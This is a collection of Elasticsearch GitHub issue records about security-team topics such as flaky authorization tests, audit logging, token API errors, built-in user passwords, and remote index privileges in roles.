* Method: testExplicitAndWildcardInclusionAndExplicitExclusions

In each case the logs are extensive and somewhat different, but they all result in thread leaks and a suite timeout.","Pinging @elastic/es-security (:Security/Authorization)Two more failures here:

https://gradle-enterprise.elastic.co/s/4l3ynd36fhgro/tests/failed
https://gradle-enterprise.elastic.co/s/yjst47s2pqexg/tests/failed#:x-pack:plugin:security-test-org.elasticsearch.xpack.security.authz-readactionstests

Unable to reproduce using:

```
./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authz.ReadActionsTests""   -Dtests.seed=7EA552089271B256   -Dtests.security.manager=true   -Dtests.locale=ar-DZ   -Dtests.timezone=Pacific/Pohnpei   -Dcompiler.java=13
```
but it did take 3 minutes on my local CI, and I wonder if this could turn into 20 minutes on jenkins under load?These tests timeout regularly (see [build stats](https://build-stats.elastic.co/app/kibana#/discover?_g=(refreshInterval:(pause:!t,value:0),time:(from:now-60d,mode:quick,to:now))&_a=(columns:!(branch,test),filters:!(),index:e58bf320-7efd-11e8-bf69-63c8ef516157,interval:auto,query:(language:lucene,query:'class:%22org.elasticsearch.xpack.security.authz.ReadActionsTests%22%20AND%20(branch:master%20OR%20branch:7.X%20OR%20branch:7.6)%20AND%20message:%22java.lang.Exception:%20Test%20abandoned%20because%20suite%20timeout%20was%20reached.%22'),sort:!(time,desc)))) and again [today on master](https://gradle-enterprise.elastic.co/s/v5k3yttxqlkak).

Following test triage rules, I'm going to mute the tests on master, 7.x and 7.6 and assign this issue.I've enabled this test again with some better timeouts.
If it fails again, please mute aggressively and ping on this issue. ",no,">test-failure,:Security/Authorization,Team:Security,"
elastic/elasticsearch,730626861,"Request body auditing for selected request types","`xpack.security.audit.logfile.events.emit_request_body` is used to toggle REST request body auditing.
This is a coarse control. I think it makes sense to be able specify auditing the body for certain requests but not others, eg only for searches but not for indexing.","Pinging @elastic/es-security (:Security/Audit)This is absolutely something that would help customers to tune their audit trails avoiding too much data to be logged.

I think that the challenging part is to define which are the ""types"" that we should use to classify our events.
Most of the time, customers have to turn the general setting on because they are looking at detailed information that they cannot get without the full request, for example which are the parameters when doing a search, or which are the new values when changing settings.

If we would be able to provide a better experience for each individual action, they probably don't need the entire body anymore, except a very few cases where their compliance policy requires it.
It would also be preferable, since the current body is exposed as a JSON-encoded string and it's not easy to manipulate or consume.

Do we already know how much effort it would require to introduce some filter on events that should emit the body?
Does it make sense to include more details into the ""default"" information for those instead?As a user of this feature, what we are after is understanding who has searched what indexes and what they were searching for. So for example we can trace that Jane User successfully searched for Guybrush Threepwood across index1, index2 and index3. We would also like to see that Jane User tried to search for poor Guybrush across index4 and index5, but was denied access.
At the moment we have configured emit body to capture what Jane User was searching for (only really works on one cluster), but as a side effect we also get the results of Jane's search which can span multiple megabytes in a single document, causing Kibana to error and not show anything with the default settings. This isn't desirable behaviour for 3 reasons:

1. We'd like to keep audit logs for a long period of time, but with some of the data being duplicated due to user activity, the costs of storage are unpredictable and rapidly skyrocketing which is an Achilles heel for the audit function (especially in cloud when trying to predict costs).
2. Although Audit data is sensitive by nature, capturing the search results in another cluster means we now have an unnecessary  secondary storage and processing headache to work through with the data owners.
3. Users only see the errors, giving a false impression of stability and usability.

Hope this helps a little.> but as a side effect we also get the results of Jane's search which can span multiple megabytes in a single document
>
> capturing the search results in another cluster means we now have an unnecessary secondary storage ...
>
Could you please clarify what do you mean by ""results"" and ""search results""? The `xpack.security.audit.logfile.events.emit_request_body` is to enable only the request body, not the response. How did the results get captured? Thanks!
[sample_redacted.txt](https://github.com/elastic/elasticsearch/files/5591228/sample_redacted.txt)
Sorry for the slow reply. I've attached a heavily redacted version of one of the monster entries from the monitoring cluster. This is capturing a copy of the data from the main cluster as part of the entry. Twice. I've obviously pruned it right back as the thought of going through a 2.5MB document to check I have redacted all the returned data was more than I could take.Actually looking over it again, it's at least partly tracking what the data_writer is writing to the indexes. Hopefully not everything, but I haven't the will to plough through all the data being written to the primary cluster. Thanks @jmac-met 

The large chunk of messages in the log file are request body, specifically a bulk indexing request body. That is why they are so big. The are _not_ search results. So no concern here. But I see your point and we are aware that these large bulk indexing request bodies can become unwieldy, which is what this issue talks about: request body for ""only for searches but not for indexing"".",no,">enhancement,:Security/Audit,team-discuss,Team:Security,"
elastic/elasticsearch,447833941,"Token API error responses fail to parse in high level rest client","If a call to the security token API results in an error, the high level rest client is unable to parse the result. This API is modeled after the OAuth2 spec and due to this the error format is different than that of normal responses.

The following is the output when attempting to refresh a token that had been refreshed over 30s ago previously:

```
ElasticsearchStatusException[Unable to parse response body]; nested: ResponseException[method [POST], host [http://127.0.0.1:58529], URI [/_security/oauth2/token], status line [HTTP/1.1 400 Bad Request]
{""error"":""invalid_grant"",""error_description"":""token has already been refreshed more than 30 seconds in the past""}];
	at org.elasticsearch.client.RestHighLevelClient.parseResponseException(RestHighLevelClient.java:1701)
	at org.elasticsearch.client.RestHighLevelClient.internalPerformRequest(RestHighLevelClient.java:1461)
	at org.elasticsearch.client.RestHighLevelClient.performRequest(RestHighLevelClient.java:1433)
	at org.elasticsearch.client.RestHighLevelClient.performRequestAndParseEntity(RestHighLevelClient.java:1400)
	at org.elasticsearch.client.SecurityClient.createToken(SecurityClient.java:706)
	at org.elasticsearch.xpack.security.authc.TokenAuthIntegTests.lambda$testRefreshingMultipleTimesFails$5(TokenAuthIntegTests.java:329)
	at org.apache.lucene.util.LuceneTestCase.expectThrows(LuceneTestCase.java:2695)
	at org.apache.lucene.util.LuceneTestCase.expectThrows(LuceneTestCase.java:2689)
	at org.elasticsearch.xpack.security.authc.TokenAuthIntegTests.testRefreshingMultipleTimesFails(TokenAuthIntegTests.java:328)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:567)
	at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
	at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
	at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
	at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
	at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
	at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
	at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
	at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
	at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
	at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
	at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
	at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
	at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
	at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
	at java.base/java.lang.Thread.run(Thread.java:835)
	Suppressed: ParsingException[Failed to parse object: expecting field with name [error] but found [error_description]]
		at org.elasticsearch.common.xcontent.XContentParserUtils.ensureFieldName(XContentParserUtils.java:50)
		at org.elasticsearch.ElasticsearchException.failureFromXContent(ElasticsearchException.java:587)
		at org.elasticsearch.rest.BytesRestResponse.errorFromXContent(BytesRestResponse.java:169)
		at org.elasticsearch.client.RestHighLevelClient.parseEntity(RestHighLevelClient.java:1721)
		at org.elasticsearch.client.RestHighLevelClient.parseResponseException(RestHighLevelClient.java:1698)
		... 46 more
Caused by: org.elasticsearch.client.ResponseException: method [POST], host [http://127.0.0.1:58529], URI [/_security/oauth2/token], status line [HTTP/1.1 400 Bad Request]
{""error"":""invalid_grant"",""error_description"":""token has already been refreshed more than 30 seconds in the past""}
	at org.elasticsearch.client.RestClient.convertResponse(RestClient.java:253)
	at org.elasticsearch.client.RestClient.performRequest(RestClient.java:231)
	at org.elasticsearch.client.RestClient.performRequest(RestClient.java:205)
	at org.elasticsearch.client.RestHighLevelClient.internalPerformRequest(RestHighLevelClient.java:1448)
	... 45 more
```","Pinging @elastic/es-core-featuresPinging @elastic/es-security",no,":Clients/Java High Level REST Client,:Security/Authentication,Team:Data Management,Team:Security,"
elastic/elasticsearch,820029294,"ActiveDirectoryRealmTests#testUnauthenticatedLookupWithConnectionPool failed to find user","**Build scan**: https://gradle-enterprise.elastic.co/s/tw7kq5un6sjus

**Repro line**: `REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.ldap.ActiveDirectoryRealmTests.testUnauthenticatedLookupWithConnectionPool"" -Dtests.seed=C166C47928FCFF84 -Dtests.security.manager=true -Dtests.locale=hi -Dtests.timezone=America/Toronto -Druntime.java=8`

**Reproduces locally?**: No, not after a few iterations.

**Applicable branches**: Only seen in 7.x.

**Failure history**: The only such failure in [many months](https://build-stats.elastic.co/goto/ed23b3c04943e3ed75835953b555b720).

**Failure excerpt**:

```
Suite: Test class org.elasticsearch.xpack.security.authc.ldap.ActiveDirectoryRealmTests
  1> [2021-03-02T07:10:15,872][INFO ][o.e.x.s.a.l.ActiveDirectoryRealmTests] [testUnauthenticatedLookupWithConnectionPool] before test
  1> [2021-03-02T07:10:16,461][WARN ][o.e.x.s.a.s.DnRoleMapper ] [testUnauthenticatedLookupWithConnectionPool] Role mapping file [/private/var/lib/jenkins/workspace/elastic+elasticsearch+7.x+multijob-darwin-compatibility/x-pack/plugin/security/build/testrun/test/temp/org.elasticsearch.xpack.security.authc.ldap.ActiveDirectoryRealmTests_C166C47928FCFF84-001/tempDir-002/config/role_mapping.yml] for realm [testunauthenticatedlookupwithconnectionpool] does not exist. Role mapping will be skipped.
  1> [2021-03-02T07:10:21,681][INFO ][o.e.x.s.a.l.ActiveDirectoryRealmTests] [testUnauthenticatedLookupWithConnectionPool] after test
  2> REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.ldap.ActiveDirectoryRealmTests.testUnauthenticatedLookupWithConnectionPool"" -Dtests.seed=C166C47928FCFF84 -Dtests.security.manager=true -Dtests.locale=hi -Dtests.timezone=America/Toronto -Druntime.java=8
  2> java.lang.AssertionError: 
    Expected: not null
         but: was null
        at __randomizedtesting.SeedInfo.seed([C166C47928FCFF84:49682346750AAACF]:0)
        at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
        at org.junit.Assert.assertThat(Assert.java:956)
        at org.junit.Assert.assertThat(Assert.java:923)
        at org.elasticsearch.xpack.security.authc.ldap.ActiveDirectoryRealmTests.doUnauthenticatedLookup(ActiveDirectoryRealmTests.java:330)
        at org.elasticsearch.xpack.security.authc.ldap.ActiveDirectoryRealmTests.testUnauthenticatedLookupWithConnectionPool(ActiveDirectoryRealmTests.java:299)
```
","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Authentication,Team:Security,"
elastic/elasticsearch,650277219,"Update custom realm documentation to reflect latest code changes","The [custom realm documentation](https://github.com/elastic/elasticsearch/blob/master/x-pack/docs/en/security/authentication/custom-realm.asciidoc) is falling behind the code changes. For examples, the package name and method signatures are no longer correct. Also we don't have a section for the new `SecurityComponents`. Its overall content also could use a review to ensure it is up to date. 

A related issue is #41494 which is about broader plugin development.","Pinging @elastic/es-security (:Security/Authentication)Pinging @elastic/es-docs (>docs)",no,">docs,:Security/Authentication,Team:Security,"
elastic/elasticsearch,523089797,"Add Openid connect integration tests","Given the async nature of openid connect authentication and the back channel communication required with the userinfo and token endpoints, unit tests such as the ones in OpenIdConnectAuthenticatorTests do not provide sufficient coverage. 

Currently we only have OpenidConnectAuthenticationIT which uses a live openid provider to perform tests that cover expected functionality with the authentication flows. We should also add additional integration tests that used a mock OP ( a mock http server should suffice) that can create malicious and/or malformed responses and tokens in response to proper requests. This would allow us to verify that our behavior is the proper one in such cases also and help prevent additional bugs such as the one fixed in https://github.com/elastic/elasticsearch/pull/49080","Pinging @elastic/es-security (:Security/Authentication)",no,">test,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317455097,"Remove BWC layers in master for user changes made in 5x","*Original comment by @jaymode:*

We made some changes to users in 5.x and along the way accumulated some BWC code that we no longer need in master, so we should remove it. Specifically thinkings of code in ServerTransportFilter.",,no,">non-issue,:Security/Authentication,Team:Security,"
elastic/elasticsearch,605215057,"Remove duplicate cluster privilege for pipeline management","During the development of version 5.0, two cluster level privileges were added for the management of pipelines `manage_pipeline` and `manage_ingest_pipelines`. `manage_ingest_pipelines` was added as part of monitoring during an attempt to future proof monitoring documents with the use of an ingest pipeline that was empty. `manage_pipeline` was added as part of a role for the add data feature in Kibana. The `manage_pipeline` name was the name chosen by the security team at that time and the `manage_ingest_pipelines` name was not reviewed by the security team.

My opinion is that the `manage_ingest_pipelines` name should be deprecated and removed in favor of the `manage_pipeline` name based on the history.","Pinging @elastic/es-security (:Security/Authorization)We discussed this in our team meeting today. We decided that it makes sense to keep one of the two privileges. 

Short term actions: 

- Remove `manage_ingest_pipelines` from the documentation
- Remove `manage_ingest_pipelines` from the response of [Get builtin privileges](https://www.elastic.co/guide/en/elasticsearch/reference/7.6/security-api-get-builtin-privileges.html) 

Tracked [here](https://github.com/elastic/elasticsearch/issues/56353)

Mid term actions : 

- Deprecate and remove the duplicate privilege. We believe that there should be a generic way to handle this kind of deprecation and we currently do not have one. This is not the first time such a need comes up and it won't be the last so I will ping @gwbrown discuss a possible plan.  ",no,":Security/Authorization,Team:Security,"
elastic/elasticsearch,317447179,"Integrity verification of auditing logs","*Original comment by @jaymode:*

Many security sensitive organizations require audit logs to written in a manner such that the validity of the log can be proven. This is often done with signing using a HMAC and providing a tool that can be used to verify the audit log.

The idea is that the tool can be used to prove that no one has modified the audit log entries or deleted anything from the audit log.


",,no,">feature,:Security/Audit,Team:Security,"
elastic/elasticsearch,317447368,"Improve the response for updating users/roles details to reflect that change has been applied","*Original comment by @bohyun-e:*

- Using 5.0 Alpha 4
- Discuss url: https://discuss.elastic.co/t/improving-the-response-for-updating-user-role-details/57397
- When users update their users/roles details, the returned json result does not reflect that the change was made. Typically users _might_ expect to see a version number (as Watcher provides in below gif) to confirm that the change has been applied.

!LINK REDACTED","Bumping this thread here.. We are still seeing this behavior on `7.6.1` when using a PUT or POST to update an existing role.
Response:

```
{
  ""role"" : {
    ""created"" : false
  }
}
```

But the changes do actually succeed.
Elasticsearch returns success or failure via HTTP status codes. If the response is `200` then the request succeeded.
The `created` field indicates whether the user (or role) was newly created (as opposed to updated)

It's unlikely will change this any time soon. It is confusing, but major changes would break clients and small tweaks aren't likely to resolve the issue completely.
We're open to suggestions though.

The [docs](https://www.elastic.co/guide/en/elasticsearch/reference/7.6/security-api-put-user.html) try and explain this:

> When an existing user is updated, created is set to false.

If there are ways that the docs could be updated to overcome the confusion that would be a fix we could make quite simply.
",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1147130133,"Enable Scoping in SAML request","### Description

SAML authentication request scoping (using IDP proxy) 
Detail are put in here
https://discuss.elastic.co/t/saml-authentication-request-scoping-using-idp-proxy/297932
","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317447116,"Allow Auto Prompt for Password Change","*Original comment by @skearns64:*

In many auth systems and applications, if a user requests that an admin reset their password, or an automated password reset system is in place, the user is required to reset their password on the next login. 

In ES, we will need Security (user metadata, perhaps?) to keep track of users who must change their passwords upon next login, and remove the flag when the password is changed.

In Kibana, we will need the login process to check for this flag and immediately redirect to a password change screen. We should probably also provide a control to allow an admin to set/unset the ""must change password"" flag on a per-user basis in the Management -> Security -> Users -> User Detail page. 


","Yes please!",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317454542,"X-Pack: Add index time sorting to log indices templates","*Original comment by @spinscale:*

We have a bunch of time based indices in x-pack, none of them uses index time sorting, even though searching would benefit a lot from that, especially the monitoring UI/watcher UI.

* Watcher: History indices
* Security: Audit log
* Monitoring: the kibana/ES time based indices","*Original comment by @pickypg:*

What's the setting for this?*Original comment by @spinscale:*

@pickypg see https://www.elastic.co/guide/en/elasticsearch/reference/6.2/index-modules-index-sorting.html

```
PUT foo
{
    ""settings"" : {
        ""index"" : {
            ""sort.field"" : ""date"", 
            ""sort.order"" : ""desc"" 
        }
    },
    ""mappings"": {
        ...
    }
}
```

Note, tracking hit counting might make sense for queries, where we dont need the hit count to speed them up.",no,">enhancement,help wanted,:Data Management/Monitoring,:Security/Audit,:Data Management/Watcher,Team:Data Management,Team:Security,"
elastic/elasticsearch,783210041,"Update BCJSSE test dependency to bctls-fips-1.0.11 fips FIPS CI ","We are currently using 1.0.9 and 1.0.11 is released/available. Initial indications show that the newer version requires additional permissions in the policy file to be granted to the provider so this will not be a drop in replacement. BouncyCastle hasn't released a UserGuide document for bctls-fips after 1.0.9 but we can reach out to them for guidance. ","Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-delivery (Team:Delivery)Pinging @elastic/es-core-infra (Team:Core/Infra)Labeling this with core/infra since it is likely to touch policy files which I want them to have visibility on.> Labeling this with core/infra since it is likely to touch policy files which I want them to have visibility on.

@mark-vieira _These are not the policy files you are looking for_ :) tbc, the policy that will be adjusted is the one we use in CI for fips matrix jobs ( https://github.com/elastic/elasticsearch/blob/master/buildSrc/src/main/resources/fips_java.policy) and not any of the policy files we ship elasticsearch with @jkakavas any objection to me removing the Delivery team label from this since I don't think this requires anything on our end as I suspect the security team will actually be implementing these changes, yes? Feel free to toss over for review though. ",no,"Team:Security,:Security/FIPS,"
elastic/elasticsearch,625619636,"[APM] Add Kibana privileges to built-in user","The built-in `apm_user` already has `read` access to the default apm indices (`apm-*`) by default:

https://github.com/elastic/elasticsearch/blob/dd4290b8485fee0b990f52e0162a4443862f82c1/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core/security/authz/store/ReservedRolesStore.java#L165-L171

However, simply assigning the `apm_user` role to a user will not grant them access to use APM in Kibana. They'll still need application privileges for APM.

**Suggestion**
To improve the getting started experience I'm proposing that `apm_user` role should have  `read` privileges to the APM feature in Kibana.

I'm thinking something like this:
```java
new RoleDescriptor.ApplicationResourcePrivileges[] {
    RoleDescriptor.ApplicationResourcePrivileges.builder()
        .application(""kibana-*"").resources(""*"").privileges(""feature_apm.read"").build()
},
```","**TLDR;** I don't think we should change the `apm_user` role to grant access to the APM feature in Kibana in a minor version as this is a breaking change. This changes the fundamental nature of the `apm_user` role to no longer just grant access to read the `apm-*` indices, but to also grant access to the APM feature in all spaces in Kibana. 

Currently, users must be assigned the `apm_user` role (or another role which grants the user access to read from the APM data-indices) in addition to a role which grants them access to the APM feature within one or many Kibana spaces to be able to use APM. If a user is assigned the `apm_user` role and a role which grants them access to APM in only a single space and then we make this change, they'll be able to see all other spaces. 

In my opinion, creating the `apm_user` role was a mistake, which I can say because [I did it...](https://github.com/elastic/elasticsearch/pull/38206). At the time, the thinking was that this better prepared us for the introduction of feature controls because it would allow us to treat APM like we ended up treating [ML and Monitoring](https://github.com/elastic/kibana/pull/30525). However, when looking into this further we realized that APM behaved like all of the other applications in Kibana and it was **not** like ML and Monitoring. Therefore, we ended up not taking advantage of the `apm_user` role and users can grant access to APM like they do all other features in Kibana by using either the `kibana_admin` reserved role, or creating custom roles which grant varying levels of access to APM in different spaces. 

> I don't think we should change the apm_user role to grant access to the APM feature in Kibana in a minor version as this is a breaking change

Obviously I'd like to land this sooner rather than later since we are currently getting a bunch of support tickets from users who are confused about the security requirements for APM. 
But I see your point about breaking expectations so 8.0 will have to do.

",no,"Team:Security,"
elastic/elasticsearch,317449083,"setup-passwords causes confusion around the purpose of builtin users","*Original comment by @tvernum:*

The problem is that once a customer runs `setup-passwords` they're given the userids and passwords for 3 users that can be quite misleading.

Since releasing `setup-passwords` in 6.0, we've seen an (anecdotal) increase in the number of customers who are using `kibana` to login to Kibana and `logstash_system` for their logstash pipelines.
And it makes sense that if users don't read the docs thoroughly, and they run the required tool and it gives them 3 users+passwords, then they'll go and use those users.

Possible solutions:
- Docs (but we have docs, so we'd need to do something fundamentally better/different than what we have now)
- More explicit output in the tool (possibly pointing to docs)
- Setup more users in the tool? If we added an option to create personal users as well, then that might guide people through the process. `Do you want to setup some logins for Kibana?` `Do you want to setup a user for logstash pipelines?`. I think it's hard to do well, but it's an option.


","*Original comment by @tvernum:*

// CC: @elastic/es-security *Original comment by @jkakavas:*

My gut feeling is that 
>More explicit output in the tool

would be the lesser evil. 

> Docs (but we have docs, so we'd need to do something fundamentally better/different than what we have now)

In this case, I think it's more of a ""users might not read documentation"" problem than a ""documentation is not clear enough"" one. 

Since this is ( I think ) mostly about users attempting to login to Kibana with the `kibana` user, should we revisit the discussion about renaming `kibana` to `kibana_system` that was started in LINK REDACTED ? ( I added the :Discuss label to that one while re-triaging and labeling before seeing this issue) *Original comment by @tvernum:*

> Since this is ( I think ) mostly about users attempting to login to Kibana with the kibana user

Mostly, but not entirely. The issue was prompted by a forum post where logstash_system was being used in a pipeline, so while the ""system"" suffix will probably help, it's not the whole solution*Original comment by @albertzaharovits:*

Here's my 2 cents:
* recommend `setup-password auto` mode instead of manual. It is auto in the [guide](https://www.elastic.co/guide/en/x-pack/6.2/security-getting-started.html) but manual in the [reference](https://www.elastic.co/guide/en/elasticsearch/reference/6.2/installing-xpack-es.html#installing-xpack-es). The idea is that a long auto-generated password should discourage humans to use them.
* generate a `kibana_admin` human friendly user, that can add other users and read anything (`kibana_user` role) and recommend it in the [installing kibana-xpack](https://www.elastic.co/guide/en/kibana/current/installing-xpack-kb.html)
* Drop a line about the purpose of these users (`kibana` and `logstash_system`), ie config entries were they should go, eg. `elasticsearch.username` inside `kibana.yml`. I would not link to docs, I fear links could get stale.
*Original comment by @bizybot:*

All good ideas, sharing an alternative here.

As this is like an app to app communication that we want to authenticate, why not use certificate-based authentication.
1. This is clear during the setup that these certificates are for the machine to machine communication.
2. Users would not be able to use them traditionally like user/password so no accidental usage.

This would involve enabling client_authentication on during setup not sure of the work on the client side (like kibana, logstash) to use certs instead of configured credentials.
Plus there is this certificate management, but IMO this seems right to me than using passwords, as this is more explicit about the usage.
*Original comment by @tvernum:*

> As this is like an app to app communication that we want to authenticate, why not use certificate-based authentication.

We need to do a better job of making certificate-based auth easier for customers to use but the issues are:
- We currently don't mandate TLS on the HTTP port
- Certificates are hard to do well, and scare customers.
- It just moves the problem from ""here's a password for logstash, but only for monitoring"" to ""here's a cert for logstash, but only for monitoring"". It helps with Kibana, but I don't have any reason to believe it helps with logstash.
",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1394849075,"RCS 2.0 - add remote indices to role models","This PR updates role-related data models to allow specifying remote
index privileges.

The change is only concerned with allowing end-users to specify a
remote cluster target via the API (i.e., not files), and to exclude
remote index privileges from local authorization. Fetching the relevant
remote index privileges and serializing them for cross cluster requests
will come in a separate PR.

The changes in this PR support specifying `remote_indices` in the Roles
API: 

```
POST /_security/role/remote-search
{
  ""indices"": [ // unchanged
    {
      ""names"": [""*index*""],
      ""privileges"": [""read""] 
    }
  ],
  ""remote_indices"": [
    {
      ""names"": [""*index*""],
      ""privileges"": [""read""],
      ""clusters"": [""remote-a"", ""remote-b-*""] 
    }
  ]
}
```

A key decision in this PR is separating `RemoteIndicesPermission`
entirely from `IndicesPermission` within `Role` and the implementing
classes. The primary reason for this is that `RemoteIndicesPermission`
and `IndicesPermission` represent fairly different concepts, in terms
of business logic. This approach also makes it easier to ensure that
remote indices permissions do not impact local authorization, since
remote index permissions are handled as a separate category altogether.
The alternative would have been extending `IndicesPermission` with
remote clusters but that would required to ""ad-hoc"" exclude them from
performing local authorization actions and made this change more
invasive and complex.
","I think I am good with keeping RemoteIndicesPermission a separate class. It probably can have a method to (internally) turn itself into a IndicesPermission so it can reuse the resourcePrivilegeCheck logic. These details can wait. At high level, this makes me think whether we should actually promote the remote indices concept all the way up to definition time. So instead of having `remote_cluster` as an optional field inside `indices`, we can have a `remote_indices` field at the same level as the existing `indices` field. This is probably a better consistency across the different layers. > It probably can have a method to (internally) turn itself into a IndicesPermission so it can reuse the resourcePrivilegeCheck logic. 

In one of the older commits I had exactly this. I think the privilege check might end up fairly different from IndicesPermission though. Agreed either way, the details on this can wait 👍 

> At high level, this makes me think whether we should actually promote the remote indices concept all the way up to definition time.

I'm following up with @bytebilly on this. I had similar thoughts as I was implementing this. I'm not opposed to introducing `remote_indices` at the same level as `indices`. It shouldn't be too much work to change it. However, I also think it's fine to have a difference between layers -- the API representation does not need to map 1-1 with the ""service"" layer.  I am still coming up to speed on this part of the code, but I like the direction. Having distinct classes for the remote vs. local seems to be a good choice. It simplifies the readability and allows for divergence where needed, but not so much as to cause duplication and future bugs. 

My own ignorance here... but I got a bit lost in the collation specifically to what/why we are collocating in `CompositeRolesStore`. It seems that if there are two sets of index privs for [""foo"",""bar""] we merge those down to 1 group, keeping the restricted indices in a separate data structure, else the collation does not do much ... is that about right? (A bit lost to why we need to track restricted indices separately, but that is tangential) It that seems the change here is mostly just adding a per cluster key to the existing model, right ? 

You have a comment ""// TODO we can merge `indicesPermissionGroups` by `indices` here"" -> can you expand on your thought here a bit more ? Is that for the transport header serialization format ? 
@jakelandis thanks for the review!

> It seems that if there are two sets of index privs for [""foo"",""bar""] we merge those down to 1 group, keeping the restricted indices in a separate data structure

Yup that's exactly it. If you have:

```
""role"": {
  ""indices"": [ 
    {
      ""names"": [""foo"", ""bar""],
      ""privileges"": [""read""] 
    },
    {
      ""names"": [""foo"", ""bar""],
      ""privileges"": [""all""] 
    }
  ]
}
```

You'd end up with a single group for [""foo"", ""bar""] with privileges [""all"", ""read""].

> It that seems the change here is mostly just adding a per cluster key to the existing model, right ?

Yup. It's essentially taking the existing approach and running it for each cluster alias pattern (and also collating by cluster pattern, when they are identical).

> A bit lost to why we need to track restricted indices separately, but that is tangential

High level, it's because the matching logic on index pattern is different when we allow restricted indices vs not: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core/security/authz/permission/IndicesPermission.java#L632-L641

Essentially, if we have:

```
""role"": {
  ""indices"": [ 
    {
      ""names"": [""*""],
      ""privileges"": [""all""] 
    },
    {
      ""names"": [""*""],
      ""privileges"": [""read""],
      ""allow_restricted"": true
    }
  ]
}
```

We **don't** want to merge those into one group; instead we want two separate groups: one which allows `all` on all (non-restricted) indices, and one that allows `read` on all indices (including restricted).

> You have a comment ""// TODO we can merge indicesPermissionGroups by indices here""

I'll give an example of what I mean:

```
""role"": {
  ""remote_indices"": [ 
    {
      ""names"": [""foo""],
      ""privileges"": [""read""],
      ""clusters"": [""cluster-*""] 
    },
    {
      ""names"": [""foo""],
      ""privileges"": [""read""],
      ""clusters"": [""*-b""] 
    }
  ]
}
```

For the above, after building the role we will have two separate remote indices groups, one for ""*-b"" and one for ""cluster-*"". If we run `RemoteIndicesPermission.forCluster(""cluster-b"")` and we don't merge, we end up with two groups. However, we can merge those into one, by index name ""foo"". > what/why we are collocating in CompositeRolesStore

I think it is not absolutely necessary from only the perspective of correctness. It is more of an optimisation so that automatons are built more efficiently and minimizied once.To keep the scope of the PR down, I will address below items in follow up PRs:

- Validation logic to verify that a given remote cluster is configured and connected
